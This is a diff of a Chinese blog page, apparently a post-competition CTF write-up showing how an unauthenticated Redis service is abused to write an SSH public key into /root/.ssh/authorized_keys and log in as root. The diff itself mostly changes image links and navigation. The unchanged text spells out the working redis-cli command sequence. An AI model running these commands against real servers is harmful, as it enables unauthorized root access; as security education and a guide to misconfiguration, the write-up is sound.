@@ -96,15 +96,15 @@
 <meta property="og:site_name" content="MelonRindCat">
 <meta property="og:description" content="前言前段时间的平衡信息杯线下赛中遇到了一个由于redis服务无密码认证的未授权访问漏洞，于是赛后复现了一次。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://owqgfzoc5.bkt.clouddn.com/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-1.png">
-<meta property="og:image" content="http://owqgfzoc5.bkt.clouddn.com/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-2.png">
-<meta property="og:image" content="http://owqgfzoc5.bkt.clouddn.com/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-4.png">
-<meta property="og:image" content="http://owqgfzoc5.bkt.clouddn.com/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-6.png">
-<meta property="og:updated_time" content="2017-11-21T08:20:11.222Z">
+<meta property="og:image" content="http://yoursite.com/2017/11/19/redis未授权访问/redis未授权访问-1.png">
+<meta property="og:image" content="http://yoursite.com/2017/11/19/redis未授权访问/redis未授权访问-2.png">
+<meta property="og:image" content="http://yoursite.com/2017/11/19/redis未授权访问/redis未授权访问-3.png">
+<meta property="og:image" content="http://yoursite.com/2017/11/19/redis未授权访问/redis未授权访问-4.png">
+<meta property="og:updated_time" content="2018-02-20T06:20:41.399Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="redis未授权访问">
 <meta name="twitter:description" content="前言前段时间的平衡信息杯线下赛中遇到了一个由于redis服务无密码认证的未授权访问漏洞，于是赛后复现了一次。">
-<meta name="twitter:image" content="http://owqgfzoc5.bkt.clouddn.com/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-1.png">
+<meta name="twitter:image" content="http://yoursite.com/2017/11/19/redis未授权访问/redis未授权访问-1.png">
 
 
 
@@ -383,16 +383,17 @@
       
         <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前段时间的平衡信息杯线下赛中遇到了一个由于redis服务无密码认证的未授权访问漏洞，于是赛后复现了一次。<br><a id="more"></a></p>
 <h3 id="SSH-key-文件的准备"><a href="#SSH-key-文件的准备" class="headerlink" title="SSH key 文件的准备"></a>SSH key 文件的准备</h3><p><code>ssh-keygen -t rsa</code></p>
-<p><img src="http://owqgfzoc5.bkt.clouddn.com/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-1.png" alt="image"></p>
+<img src="/2017/11/19/redis未授权访问/redis未授权访问-1.png" alt="redis未授权访问-1.png" title="">
 <p>在当前目录先生成.ssh的文件夹，里面有两个文件，一个私钥 id_rsa,一个公钥 id_rsa.pub。</p>
-<p><img src="http://owqgfzoc5.bkt.clouddn.com/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-2.png" alt="image"></p>
+<img src="/2017/11/19/redis未授权访问/redis未授权访问-2.png" alt="redis未授权访问-2.png" title="">
 <h3 id="连接redis"><a href="#连接redis" class="headerlink" title="连接redis"></a>连接redis</h3><p><code>redis-cli -h 目标ip</code></p>
 <p>使用redis-cli远程管理成功连接上无认证的redis服务，由于redis拥有可以写文件的权限，所以尝试将公钥信息写入目标主机。</p>
 <p><code>config set dir /root/.ssh/</code></p>
 <p>切换当前路径</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">config set dbfilename authorized_keys</div><div class="line">set melon &quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAwfw7hBoDJmxxGC2cgaXkwWzO8PouedX1mFNcH3zw2M38y1OXF59NQh9ZBsu89cj52FQHaqMToA5SEULrsnmSdBGXbyCb4MIar6WNREX/CndH7/X5FUw3rvnmSvwHgylYCrWDMWK8amU5DLTEn5YAA13voBVJyEFj1qB76MtNnQSxKlnOrWnXimWy+4dvqKXWhJ2OdB3bDhqjghZ6RyEB1oOOKh4GiMTkmTkd5YhRjFCWlroQE3hAmRHmnPSCZTcrOkQtk2/sqodSiFNQnWO+yU6pWH23EyY6SPEGU0GGfhFUi4kDdHdUwFTxxYDAffpKaMxCf0aeH+uoiINWn50q2Q== root@iZwz9a0cr2yno695xeldpyZ\n\n\n&quot;</div><div class="line">save</div></pre></td></tr></table></figure>
-<p>将公钥信息写入authorized_keys文件，保存。<br><img src="http://owqgfzoc5.bkt.clouddn.com/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-4.png" alt="image"></p>
-<h3 id="ssh连接目标主机"><a href="#ssh连接目标主机" class="headerlink" title="ssh连接目标主机"></a>ssh连接目标主机</h3><p><code>ssh 目标ip</code><br><img src="http://owqgfzoc5.bkt.clouddn.com/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-6.png" alt="image"><br>（这里为了避免冲突，将ssh端口改为222）<br>成功连接目标主机</p>
+<p>将公钥信息写入authorized_keys文件，保存。</p>
+<img src="/2017/11/19/redis未授权访问/redis未授权访问-3.png" alt="redis未授权访问-3.png" title="">
+<h3 id="ssh连接目标主机"><a href="#ssh连接目标主机" class="headerlink" title="ssh连接目标主机"></a>ssh连接目标主机</h3><p><code>ssh 目标ip</code><br><img src="/2017/11/19/redis未授权访问/redis未授权访问-4.png" alt="redis未授权访问-4.png" title=""><br>（这里为了避免冲突，将ssh端口改为222）<br>成功连接目标主机</p>
 <h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>漏洞形成的原因</p>
 <ol>
 <li>redis服务无认证，且暴露在公网。</li>
@@ -434,8 +435,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/10/15/hexo折腾笔记/" rel="next" title="hexo折腾笔记">
-                <i class="fa fa-chevron-left"></i> hexo折腾笔记
+              <a href="/2017/10/15/阿里云centos 6.8 pptp搭建笔记/" rel="next" title="阿里云centos 6.8 pptp搭建笔记">
+                <i class="fa fa-chevron-left"></i> 阿里云centos 6.8 pptp搭建笔记
               </a>
             
           </div>
@@ -443,6 +444,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/02/20/hexo折腾笔记/" rel="prev" title="hexo折腾笔记">
+                hexo折腾笔记 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -544,7 +549,7 @@
               
               
               <div class="site-state-item site-state-tags">
-                <a href="/tags/index.html">
+                <a href="/tags/tags.html">
                   <span class="site-state-item-count">13</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
